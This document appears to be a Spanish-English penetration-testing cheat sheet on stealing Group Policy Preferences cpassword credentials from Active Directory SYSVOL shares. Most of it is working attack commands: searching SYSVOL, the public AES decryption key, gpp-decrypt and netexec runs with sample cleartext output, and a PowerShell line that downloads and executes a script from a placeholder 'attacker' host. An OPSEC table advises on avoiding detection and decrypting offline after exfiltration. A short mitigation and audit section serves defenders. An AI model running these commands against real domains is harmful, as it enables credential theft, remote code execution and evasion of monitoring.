---
aliases:
  - GPP cpassword
  - Group Policy Preferences
  - MS14-025
  - gpp-decrypt
tags:
  - type/technique
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - GPO y SYSVOL Enumeration]]"
  - "[[SYSVOL y GPP cpassword]]"
---
# AD - GPO y SYSVOL Enumeration - GPP cpassword

***

## Find cpassword in SYSVOL

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `findstr /S /I "cpassword" \\<DC>\sysvol\corp.local\Policies\*.xml` | Windows native search | Quick. |
| `grep -r "cpassword" /mnt/sysvol --include="*.xml"` | Linux mounted | Standard. |
| `find /mnt/sysvol -name "*.xml" -exec grep -l "cpassword" {} \;` | Linux find + grep | Alt. |
| `nxc smb <DC> -u u -p p -M gpp_password` | Auto-detect + decrypt | Quick all-in-one. |
| `Get-ChildItem -Recurse \\<DC>\sysvol\*.xml \| Select-String "cpassword"` | RSAT bulk | Standard. |
^ad-cpassword-find

```bash
# Find + dump
mount -t cifs //<DC>/SYSVOL /mnt/sysvol -o user=u,pass=pass,dom=corp
grep -rl "cpassword" /mnt/sysvol --include="*.xml"

# Por archivo
grep -hPo 'cpassword="[^"]+"' /mnt/sysvol/corp.local/Policies/*/Machine/Preferences/*/*.xml
```

___

## Decrypt cpassword (gpp-decrypt)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `gpp-decrypt '<cpassword-blob>'` | Cleartext password | Standard. |
| `nxc smb <DC> -u u -p p -M gpp_password` | Auto-decrypt en pipeline | Quick. |
| `Invoke-GPPPasswordDecryption '<blob>'` (PowerSploit) | Windows | Native PS. |
| Custom Python script con AES key (público) | DIY | Edge. |
^ad-cpassword-decrypt

**AES key MS-GPPREF (público):**
```
4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
```

```bash
# gpp-decrypt CLI
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcoXggUu4n8eCoF3KJU7vJ8M'
# Output: Local*P4ssword!2

# Inline desde file
grep -hPo 'cpassword="\K[^"]+' /mnt/sysvol/corp.local/Policies/*/Machine/Preferences/*/*.xml |
  while read pwd; do gpp-decrypt "$pwd"; done
```

___

## GPP File Patterns

| **File** | **Common attribute** | **Cred type** |
|:---:|:---:|:---:|
| `Groups.xml` | `<User newName="..." cpassword="..."/>` | Local user account |
| `ScheduledTasks.xml` | `<Properties runAs="..." cpassword="..."/>` | Task run-as |
| `Services.xml` | `<Properties accountName="..." cpassword="..."/>` | Service account |
| `DataSources.xml` | `<Properties username="..." cpassword="..."/>` | DB connection |
| `Drives.xml` | `<Properties username="..." cpassword="..."/>` | Mapped drive |
| `Printers.xml` | `<Properties username="..." cpassword="..."/>` | Printer install |
^ad-cpassword-patterns

___

## netexec gpp Modules

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <DC> -u u -p p -M gpp_password` | Auto-detect + decrypt cpassword | Standard. |
| `nxc smb <DC> -u u -p p -M gpp_autologin` | Auto-login GPP credentials | Adjacent. |
| `nxc smb <DC> -u u -p p -M spider_plus -o INTERESTING_EXTENSIONS=xml` | Spider XML files | Pre-cpassword. |
^ad-cpassword-netexec

```bash
# Standard nxc gpp_password
nxc smb <DC> -u user -p pass -M gpp_password

# Output:
# [+] Found credentials at \\<DC>\SYSVOL\corp.local\Policies\{...}\Machine\Preferences\Groups\Groups.xml
# [+] User: localadmin
# [+] Password: Local*P4ssword!2
```

___

## PowerSploit Get-GPPPassword

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-GPPPassword` | Auto-search + decrypt en SYSVOL | Native Windows. |
| `Get-GPPPassword -Domain corp.local` | Cross-domain | Multi-domain. |
| `Get-GPPAutologon` | Auto-login GPP | Adjacent. |
^ad-cpassword-powersploit

```powershell
# Import PowerSploit
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerSploit/Exfiltration/Get-GPPPassword.ps1')

Get-GPPPassword
# Output: UserName, NewName, Cpassword, Password (decrypted), Changed, Domain, Type
```

___

## Modern Mitigations

| **Comando / Setting** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| MS14-025 patch (mayo 2014) | Block creación de nuevos GPP cpassword | Standard moderno. |
| Cleanup XMLs legacy | `findstr /S /I "cpassword" \\<DC>\sysvol\*.xml` + manual remove | Required. |
| Replace GPP cred deployment con LAPS / gMSA | Modern alt | Best practice. |
| Restrict SYSVOL read a domain users (default Authenticated Users) | Hardening per-OU | Defense. |
| Quarterly compliance scan | `findstr /S cpassword` | Audit. |
| Detection: 4663 (file access) en SYSVOL | SIEM rule | Defender. |
^ad-cpassword-mitigations

```cmd
:: Quarterly audit
findstr /S /I "cpassword" \\<DC>\sysvol\*.xml > cpassword_audit.txt
:: Cualquier match = legacy GPP a remover
```

___

## OPSEC

| **Práctica** | **Detalle** | **Cuándo** |
|:---:|:---:|:---:|
| Mass SYSVOL read es loud | Default Auth Users read = silent recon | OPSEC win. |
| nxc gpp_password vs grep manual | nxc puede generar logs adicionales | Stealth ≈ manual. |
| Detection: 4663 audit SACL en SYSVOL | Defender side | Adjacent. |
| Decrypt offline post-exfil | Sin queries AD | Stealth. |
| Cleanup post-engagement | No leftovers | Hygiene. |
^ad-cpassword-opsec

***
